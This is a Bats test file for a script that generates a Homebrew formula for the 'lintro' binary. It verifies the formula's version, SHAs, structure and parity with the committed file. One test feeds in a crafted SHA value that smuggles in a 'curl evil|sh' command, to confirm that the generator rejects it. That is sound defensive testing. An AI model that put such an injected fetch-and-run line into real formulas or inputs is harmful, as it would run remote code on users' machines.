#!/usr/bin/env bats
# SPDX-License-Identifier: MIT
# Purpose: Tests for binary formula generation.

load "../../../helpers/common"

setup() {
	setup_temp_dir
	REPO_ROOT="$(repo_root)"
	bootstrap_test_env "$REPO_ROOT"
	SCRIPTS_DIR="$REPO_ROOT/scripts/ci"
}

teardown() {
	teardown_temp_dir
}

# Derive the committed lintro binary version and per-arch shas so the tests
# track releases instead of pinning literals that break on every version bump.
committed_version() {
	sed -nE 's/^[[:space:]]*version[[:space:]]+"([^"]+)".*/\1/p' \
		"$REPO_ROOT/Formula/lintro.rb" | head -1
}

committed_sha() { # $1 = on_arm | on_intel
	awk -v blk="$1" '
		$0 ~ blk { f = 1 }
		f && /sha256/ { gsub(/[",]/, "", $2); print $2; exit }
	' "$REPO_ROOT/Formula/lintro.rb"
}

committed_assets() {
	printf '{"arm64-sha":"%s","x86-sha":"%s"}' \
		"$(committed_sha on_arm)" "$(committed_sha on_intel)"
}

@test "generate-binary-formula: lintro binary structure and SHAs" {
	export SKIP_ASSET_VERIFY=1
	output_file="$TEST_TEMP_DIR/lintro.rb"
	version="$(committed_version)"
	arm="$(committed_sha on_arm)"
	x86="$(committed_sha on_intel)"

	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
		--config "$REPO_ROOT/formulas/lintro.yml" \
		--formula-key lintro \
		--version "$version" \
		--output "$output_file" \
		--binary-assets "$(committed_assets)"

	[ "$status" -eq 0 ]
	grep -q '# typed: strict' "$output_file"
	grep -q 'class Lintro < Formula' "$output_file"
	grep -q "version \"${version}\"" "$output_file"
	grep -q "$arm" "$output_file"
	grep -q "$x86" "$output_file"
	grep -q 'lintro-macos-arm64' "$output_file"
	grep -q 'conflicts_with "lintro-full"' "$output_file"
	grep -q 'pipe_output("PYTHONIOENCODING=utf-8 #{bin}/lintro doctor 2>&1")' "$output_file"
}

@test "generate-binary-formula: rejects non-hex sha" {
	output_file="$TEST_TEMP_DIR/lintro.rb"
	binary_assets="{\"arm64-sha\":\"deadbeef\\\"\\n    system \\\"curl evil|sh\\\"\\n    sha256 \\\"x\",\"x86-sha\":\"$(committed_sha on_intel)\"}"

	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
		--config "$REPO_ROOT/formulas/lintro.yml" \
		--formula-key lintro \
		--version "$(committed_version)" \
		--output "$output_file" \
		--binary-assets "$binary_assets"

	[ "$status" -ne 0 ]
	[[ "$output" == *"64-character lowercase hex"* ]]
}

@test "generate-binary-formula: parity with committed lintro.rb" {
	export SKIP_ASSET_VERIFY=1
	output_file="$TEST_TEMP_DIR/lintro.rb"

	# Regenerate using the version and shas read straight from the committed
	# formula, so this stays green across releases without fixture edits.
	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
		--config "$REPO_ROOT/formulas/lintro.yml" \
		--formula-key lintro \
		--version "$(committed_version)" \
		--output "$output_file" \
		--binary-assets "$(committed_assets)"

	[ "$status" -eq 0 ]
	assert_files_equal "$REPO_ROOT/Formula/lintro.rb" "$output_file"
}
